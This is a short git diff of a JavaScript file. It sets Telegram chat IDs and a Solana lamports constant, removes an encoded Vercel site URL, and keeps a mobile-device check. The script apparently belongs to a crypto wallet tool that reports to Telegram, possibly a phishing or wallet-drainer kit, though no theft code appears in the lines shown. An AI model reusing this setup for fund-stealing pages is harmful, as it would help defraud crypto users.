@@ -5,9 +5,7 @@ $(document).ready(async function () {
   // const chatId = "7050439107"; // Sostituisci con il tuo chat ID
   const chatId = "927059314"; // Sostituisci con il tuo chat ID
   const LAMPORTS_PER_SOL = 1000000000; // 1 SOL = 1.000.000.000 lamport
-  const siteURLX = "https://jjup-theme.vercel.app";
-  const encodedURLX = encodeURIComponent(siteURL);
-  const isMobile =
+   const isMobile =
     /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
       navigator.userAgent
     );
